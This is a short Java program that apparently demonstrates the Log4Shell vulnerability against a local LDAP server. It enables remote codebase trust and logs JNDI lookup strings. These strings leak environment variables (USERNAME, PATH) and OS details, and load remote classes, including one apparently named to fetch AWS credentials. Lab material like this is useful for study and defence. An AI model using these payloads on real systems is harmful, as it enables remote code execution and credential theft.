package log4shell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class FailingApp {
  private static final Logger log = LogManager.getLogger(FailingApp.class);

  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    log.info("date ${date}");
    log.info("${jndi:ldap://127.0.0.1:1389/run=log4shell.Exploit}");
    log.info("${jndi:ldap://127.0.0.1:1389/run=log4shell.ExploitP,msg=my friend}");
    log.info("${jndi:ldap://127.0.0.1:1389/log=PATH:${env:USERNAME}}");
    log.info("${jndi:ldap://127.0.0.1:1389/log=PATH:${env:PATH}}");
    log.info("${jndi:ldap://127.0.0.1:1389/log=os=${java:os}}");
    log.info("${jndi:ldap://127.0.0.1:1389/run=log4shell.aws.FetchCreds}");
  }
}
